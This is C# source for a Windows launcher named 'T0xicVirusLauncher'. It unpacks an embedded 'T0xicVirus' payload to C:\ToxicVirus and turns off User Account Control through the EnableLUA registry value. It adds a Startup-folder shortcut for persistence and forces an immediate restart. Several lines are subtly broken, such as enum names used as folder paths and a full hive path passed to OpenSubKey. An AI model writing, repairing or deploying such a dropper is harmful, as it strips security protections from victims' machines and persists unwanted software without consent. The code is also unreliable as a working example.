using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using Microsoft.Win32;

namespace T0xicVirusLauncher
{
    public partial class T0xicVirusLauncher : Form
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //DON'T TOUCH THIS CODE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public T0xicVirusLauncher()
        {
            InitializeComponent();
            Directory.CreateDirectory(@"C:\ToxicVirus");
            Extract("T0xicVirusLauncher", @"C:\ToxicVirus", "Resources", "T0xicVirus.zip");
            ZipFile.ExtractToDirectory(@"C:\ToxicVirus\T0xicVirus.zip", @"C:\ToxicVirus");
            System.IO.File.Delete(@"C:\ToxicVirus\T0xicVirus.zip");
            RegistryKey disableuac = Registry.LocalMachine.OpenSubKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            disableuac.DeleteValue("EnableLUA");
            disableuac.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
            WshShell wsh = new WshShell();
            IWshShortcut shortcut = wsh.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\T0xicVirus.lnk") as IWshShortcut;
            shortcut.TargetPath = @"C:\ToxicVirus\T0xicVirus.exe";
            shortcut.WorkingDirectory = @"C:\ToxicVirus";
            shortcut.Save();
            System.IO.File.Copy(Environment.SpecialFolder.Desktop + @"\T0xicVirus.lnk", Environment.SpecialFolder.ApplicationData + @"Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T0xicVirus.lnk");
            MessageBox.Show("Install T0xicVirus is Complete, Your PC will be automatically restart", "T0xic Virus Launcher", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Process.Start("shutdown", "/r /t 0");
            Environment.Exit(-4);
        }
    }
}
